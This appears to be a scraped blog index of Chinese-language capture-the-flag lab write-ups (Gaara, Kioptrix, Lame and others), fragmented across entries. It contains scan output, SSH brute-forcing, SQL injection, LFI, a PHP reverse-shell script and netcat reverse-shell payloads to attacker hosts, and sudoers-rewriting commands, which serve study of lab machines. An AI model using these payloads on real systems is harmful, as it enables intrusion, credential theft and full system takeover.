ssh-hostkey: | 2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA) | 256 7889b3a2751276922af98d27c108a7b9 (ECDSA) |_ 256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/15%OT=22%CT=1%CU=43591%PV=Y%DS=4%DC=T%G=Y%TM=646238E OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%TS=C)SEQ(SP=108%GC OS:D=1%ISR=10A%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1 OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q= OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16 OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=9784%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 587/tcp) HOP RTT ADDRESS 1 274.18 ms 192.168.45.1 2 274.21 ms 192.168.45.254 3 276.92 ms 192.168.251.1 4 277.04 ms 192.168.213.211 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.84 seconds gobuster dir --url http://192.168.213.211/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -k -r -x -e php,cgi,txt,log,conf /election (Status: 200) [Size: 7003] /phpmyadmin (Status: 200) [Size: 10531] 查看phpmyadmin版本 http://192.168.213.211/phpmyadmin//doc/html/index.html phpmyadmin的版本为4.6.6，没有什么漏洞。好像努力错方向了，选择大于努力，换一个选择。 ──(root💀Chinchin)-[~/桌面] └─# searchsploit election -------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------- --------------------------------- Adobe Flash - Selection.setFocus Use-After-Free | multiple/dos/40307.txt Adobe Flash Selection.SetSelection - Use-After-Free | windows_x86-64/dos/39043.txt eLection 2.0 - 'id' SQL Injection | php/webapps/48122.txt Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86 | linux_x86-64/local/9083.c Microsoft Internet Explorer 9 - IEFRAME CSelection­Interact­Button­Behavior::_Upda | windows/dos/40907.html Microsoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow | windows/dos/16166.py SunView (SunOS 4.1.1) - 'selection_svc' Remote File Read | solaris/remote/19040.txt -------------------------------------------------------------------------------------- --------------------------------- # Title: eLection 2.0 - 'id' SQL Injection # Date: 2020-02-21 # Exploit Author: J3rryBl4nks # Vendor Homepage: https://sourceforge.net/projects/election-by-tripath/ # Software Link: https://sourceforge.net/projects/election-by-tripath/files/#Version 2.0 # Tested on Ubuntu 19/Kali Rolling # The eLection Web application is vulnerable to authenticated SQ","date":"2023-12-07","objectID":"/election1/:0:0","tags":["靶场"],"title":"Election1","uri":"/election1/"},{"categories":["靶场"],"content":" nmap -sS -sV -A -p- --min-rate 5000 192.168.183.111 ┌──(root㉿kali)-[~/桌面/vpn] └─# gobuster dir -u http://192.168.183.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -x php,txt,log,conf =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.183.111/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,log,conf,php [+] Expanded: true [+] Timeout: 10s =============================================================== 2023/05/06 10:46:09 Starting gobuster in directory enumeration mode =============================================================== http://192.168.183.111/.php (Status: 403) [Size: 280] http://192.168.183.111/index.php (Status: 200) [Size: 3468] http://192.168.183.111/profile.php (Status: 302) [Size: 7247] [--\u003e http://192.168.183.111/index.php] http://192.168.183.111/header.php (Status: 200) [Size: 1666] http://192.168.183.111/store (Status: 301) [Size: 318] [--\u003e http://192.168.183.111/store/] http://192.168.183.111/admin (Status: 301) [Size: 318] [--\u003e http://192.168.183.111/admin/] http://192.168.183.111/registration.php (Status: 200) [Size: 9409] http://192.168.183.111/logout.php (Status: 200) [Size: 75] http://192.168.183.111/robots.txt (Status: 200) [Size: 14] http://192.168.183.111/dashboard.php (Status: 302) [Size: 10272] [--\u003e http://192.168.183.111/index.php] http://192.168.183.111/secret (Status: 301) [Size: 319] [--\u003e http://192.168.183.111/secret/] http://192.168.183.111/leftbar.php (Status: 200) [Size: 1837] admin' or 1=1-- + 上传反弹shell的php文件 \u003c?php $sock = fsockopen(\"192.168.45.5\", 1234); $descriptorspec = array( 0 =\u003e $sock, 1 =\u003e $sock, 2 =\u003e $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process); ?\u003e cat /var/www/loal.txt 4d398ace4b6acf45d1b7f2e3e84c344b cd /home/tony cat password.txt tony@funbox3:~$ cat password.txt ssh: yxcvbnmYYY gym/admin: asdfghjklXXX /store: admin@admin.com admin 使用ssh登录 ssh tony@192.168.183.111 //密码是yxcvbnmYYY tony@funbox3:~$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.1.5 - Safe OSCP by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector RED: You must take a look at it LightCyan: Users with console Blue: Users without console \u0026 mounted devs Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username Starting linpeas. Caching Writable Folders... ════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 User \u0026 Groups: u","date":"2023-12-07","objectID":"/funbox/:0:0","tags":["靶场"],"title":"funbox","uri":"/funbox/"},{"categories":null,"content":" nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.159.111 gobuster dir --url http://192.168.159.111/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -e -k -r -x php,cgi,txt,log,conf ","date":"2023-12-07","objectID":"/funboxeasy/:0:0","tags":null,"title":"funboxeasy","uri":"/funboxeasy/"},{"categories":["靶场"],"content":" ┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.142 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 09:16 CST Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 5.58% done; ETC: 09:16 (0:00:17 remaining) Nmap scan report for 192.168.213.142 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 3ea36f6403331e76f8e498febee98e58 (RSA) | 256 6c0eb500e742444865effed77ce664d5 (ECDSA) |_ 256 b751f2f9855766a865542e05f940d2f4 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Gaara |_http-server-header: Apache/2.4.38 (Debian) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42661%PV=Y%DS=4%DC=T%G=Y%TM=64657C9 OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M OS:551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7% OS:O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y% OS:DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD= OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=53 OS:10%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 215.67 ms 192.168.45.1 2 215.72 ms 192.168.45.254 3 216.49 ms 192.168.251.1 4 216.63 ms 192.168.213.142 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 44.51 seconds http://192.168.213.142/Cryoserver /Temari /Kazekage /iamGaara ┌──(root㉿kali)-[~/桌面/vpn] └─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 30 ssh://192.168.213.142 Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-18 09:42:15 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task [DATA] attacking ssh://192.168.213.142:22/ [STATUS] 190.00 tries/min, 190 tries in 00:01h, 14344219 to do in 1258:16h, 20 active [22][ssh] host: 192.168.213.142 login: gaara password: iloveyou2 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 10 final worker threads did not complete until end. [ERROR] 10 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-18 09:43:24 ssh登录，gaara:iloveyou2 gaara@Gaara:~$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.1.5 - Safe OSCP by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational","date":"2023-12-07","objectID":"/gaara/:0:0","tags":["靶场"],"title":"GAARA","uri":"/gaara/"},{"categories":["靶场"],"content":" ┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.189.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 17:59 CST Nmap scan report for 192.168.189.14 Host is up (0.27s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.45.174 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 0 0 4096 Feb 08 2020 pub [NSE: writeable] 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 061ba39283a57a15bd406e0c8d98277b (RSA) | 256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA) |_ 256 6554fc2d12ace184783e0023fbe4c9ee (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.38 (Debian) Aggressive OS guesses: Linux 4.4 (91%), Linux 3.10 - 3.12 (90%), Linux 4.9 (89%), Linux 4.0 (88%), Linux 3.10 - 3.16 (88%), Linux 3.11 - 4.1 (87%), Linux 2.6.32 (87%), Linux 3.5 (87%), Linux 4.2 (87%), Synology DiskStation Manager 5.1 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 4 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 260.61 ms 192.168.45.1 2 260.69 ms 192.168.45.254 3 261.48 ms 192.168.251.1 4 261.66 ms 192.168.189.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.71 seconds =============================================================== 2023/05/20 18:23:23 Starting gobuster in directory enumeration mode =============================================================== http://192.168.189.14/.php (Status: 403) [Size: 279] http://192.168.189.14/manual (Status: 200) [Size: 626] http://192.168.189.14/javascript (Status: 403) [Size: 279] http://192.168.189.14/robots.txt (Status: 200) [Size: 59] 访问robots.txt,提示不是search engine。尝试下变换user-agent为baidu，可以正常访问了 http://192.168.189.14//secret_information/?lang=en.php 可能存在本地文件包含，尝试传参../../../../etc/passwd,成功读取到文件 结合ftp匿名传输上传eval.php到/pub/eval.php 通过LFI读取ftp配置 http://192.168.189.14//secret_information/?lang=../../../../etc/vsftpd.conf 配置文件末尾写了一句 anon_root=/var/ftp/ write_enable=YES # 尝试构造payload，通过文件包含运行刚刚上传的eval.php,同时监听端口接收shell ┌──(root💀Chinchin)-[~/桌面/vpn] └─# nc -lvnp 1234 listening on [any] 1234 ... curl 192.168.189.14//secret_information/?lang=/var/ftp/pub/eval.php ┌──(root💀Chinchin)-[~/桌面/vpn] └─# nc -lvnp 1234 listening on [any] 1234 ... connect to [192.168.45.174] from (UNKNOWN) [192.168.189.14] 41140 Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux 00:53:49 up 16 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ which python /usr/bin/python $ $ which python3 /usr/bin/python3 $ ^?^?python3 -c 'import pty; pty.spawn (\"/bin/bash\")' /bin/sh: 4: python3: not found $ python3 -c 'import pty; pty.spawn (\"/bin/bash\")' www-data@inclusiveness:/$ ls ls bin home lib32 media root sys vmlinuz boot initrd.img lib64 mnt run tmp vmlinuz.old dev initrd.img.old libx32 opt sbin usr etc lib lost+found proc srv var www-data@inclusiveness:/$ cd /home cd /home www-data@inclusiveness:/home$ ls ls tom www-data@inclusiveness:/home$ cd tom cd tom www-data@inclusiveness:/home/tom$ ls ls Desktop Downloads Pictures Templates local.txt rootshell.c Documents Music Public Videos rootshell www-data@inclusiveness:/home/tom$ cat local.txt cat local.txt 0fb779bbe3be4b5dae5413c2969fdc0d find / -per","date":"2023-12-07","objectID":"/inclusiveness/:0:0","tags":["靶场"],"title":"Inclusiveness","uri":"/inclusiveness/"},{"categories":["靶场"],"content":" 安装好，虚拟机使用桥接模式，和物理机划分到同一个网段。 kali运行arp-scan -l 扫描同网络上的所有主机，确定靶机的ip。端口探测后生成报告 查看80端口web服务 使用的是lotuscms，搜索了历史版本的漏洞，有一个公开了的RCE，payload如下 POST /index.php HTTP/1.1 Host: 192.168.3.115 Content-Length: 0 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 page=index');${system('nc -e /bin/sh 192.168.3.201 12345')};#\" 漏洞成因是代码里使用了eval函数，后续的system函数会执行恶意的命令，从eval函数的代码执行到远程命令执行 读取gconfig.php \u003c?php error_reporting(0); /* A sample Gallarific configuration file. You should edit the installer details below and save this file as gconfig.php Do not modify anything else if you don't know what it is. */ // Installer Details ----------------------------------------------- // Enter the full HTTP path to your Gallarific folder below, // such as http://www.yoursite.com/gallery // Do NOT include a trailing forward slash $GLOBALS[\"gallarific_path\"] = \"http://kioptrix3.com/gallery\"; $GLOBALS[\"gallarific_mysql_server\"] = \"localhost\"; $GLOBALS[\"gallarific_mysql_database\"] = \"gallery\"; $GLOBALS[\"gallarific_mysql_username\"] = \"root\"; $GLOBALS[\"gallarific_mysql_password\"] = \"fuckeyou\"; // Setting Details ------------------------------------------------- if(!$g_mysql_c = @mysql_connect($GLOBALS[\"gallarific_mysql_server\"], $GLOBALS[\"gallarific_mysql_username\"], $GLOBALS[\"gallarific_mysql_password\"])) { echo(\"A connection to the database couldn't be established: \" . mysql_error()); die(); }else { if(!$g_mysql_d = @mysql_select_db($GLOBALS[\"gallarific_mysql_database\"], $g_mysql_c)) { echo(\"The Gallarific database couldn't be opened: \" . mysql_error()); die(); }else { $settings=mysql_query(\"select * from gallarific_settings\"); if(mysql_num_rows($settings)!=0){ while($data=mysql_fetch_array($settings)){ $GLOBALS[\"{$data['settings_name']}\"]=$data['settings_value']; } } } } ?\u003e 拿到shell后，wget下载脏牛提权 成功添加用户，并添加到root组 ssh登录。用脏牛提权生成的账号firefart登录，获取到root权限，通关 ","date":"2023-12-07","objectID":"/kioptrix-level-1.2-#3/:0:0","tags":["靶场"],"title":"KIOPTRIX LEVEL 1.2 (#3)","uri":"/kioptrix-level-1.2-#3/"},{"categories":["靶场"],"content":" python -c 'import pty; pty.spawn (\"/bin/sh\")' echo os.system ('/bin/bash') /bin/sh -i perl —e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\"; ruby: exec \"/bin/sh\" lua: os.execute ('/bin/sh') exec \"/bin/sh\" 先贴上一些常用的从受限制shell逃逸的命令，大部分命令是利用主机上安装的脚本语言，来运行一些命令执行的函数，如python的os.system()，lua的os.exec()函数，利用函数运行/bin/bash或/bin/sh等shell应用，切换到无限制shell。 select sys_exec('rm -r /etc/sudoers'); select sys_exec('chmod 0440 /etc/sudoers'); select sys_exec('echo \"john ALL=(ALL) NOPASSWD: ALL\" \u003e\u003e /etc/sudoers'); sql注入获得数据库权限，利用自建函数，sys_exec 将用户john加入超级用户文件sudoers ","date":"2023-12-07","objectID":"/kioptrix-level-1.3-#4/:0:0","tags":["靶场"],"title":"KIOPTRIX LEVEL 1.3 (#4)","uri":"/kioptrix-level-1.3-#4/"},{"categories":["靶场"],"content":" nmap -sV -vv -sT --script vuln 10.129.192.173 \u003e res.txt 2\u003e\u00261 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 发现开放了21，22，139，445端口。这里补充一个nmap的技巧，当我们想要更深入了解某一个服务的版本，比方说smb的服务版本。可以使用 ls /usr/share/nmap/scripts|grep {service name} 我这里看了writeup使用了smb-enum-shares吗，正常的情况下应该对每一种可能出现漏洞的服务进行漏洞扫描。（比如vsftpd,openssh等等其他的服务，都需要仔细地对可能出现漏洞的每一个服务信息收集） Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 11:10 CST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 0.00% done Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 0.00% done Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 0.00% done Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 0.00% done Nmap scan report for 10.129.119.38 Host is up (0.24s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: \u003cblank\u003e | \\\\10.129.119.38\\ADMIN$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp | Anonymous access: \u003cnone\u003e | \\\\10.129.119.38\\IPC$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp | Anonymous access: READ/WRITE | \\\\10.129.119.38\\opt: | Type: STYPE_DISKTREE | Comment: | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp | Anonymous access: \u003cnone\u003e | \\\\10.129.119.38\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u003cnone\u003e | \\\\10.129.119.38\\tmp: | Type: STYPE_DISKTREE | Comment: oh noes! | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp |_ Anonymous access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 106.91 seconds 启动msfconsole，search Samba 3.0.20-Debian，没有结果。扩大搜索范围search Samba 3.0.20，找到对应漏洞利用模块。拿到靶机shell。 将shell升级为交互式shell，使用以下模块 use post/multi/manage/shell_to_meterpreter sessions -l set session 1 run cat /home/makis/user.txt cat /root/root.txt 总结：信息收集阶段一定要仔细，对每一个端口上运行的程序，程序的版本都要作记录。因为后续漏洞发现阶段需要用到程序的版本信息。附上不使用msf的漏洞利用命令 smbclient -U “/=\\`nohup nc -e /bin/sh LHOST LPORT\\`” -N -I target_ip ","date":"2023-12-07","objectID":"/lame/:0:0","tags":["靶场"],"title":"lame","uri":"/lame/"},{"categories":["靶场"],"content":"信息收集 nmap -sS -A -sC -sV -p- --min-rate 5000 ┌──(root💀Chinchin)-[~/桌面/htb] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 00:39 CST Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 30.04% done; ETC: 00:40 (0:00:16 remaining) Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 32.83% done; ETC: 00:40 (0:00:16 remaining) Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 34.15% done; ETC: 00:40 (0:00:15 remaining) Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 35.46% done; ETC: 00:40 (0:00:16 remaining) Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 37.07% done; ETC: 00:40 (0:00:15 remaining) Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 38.10% done; ETC: 00:40 (0:00:16 remaining) Nmap scan report for 10.129.85.115 Host is up (0.44s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) 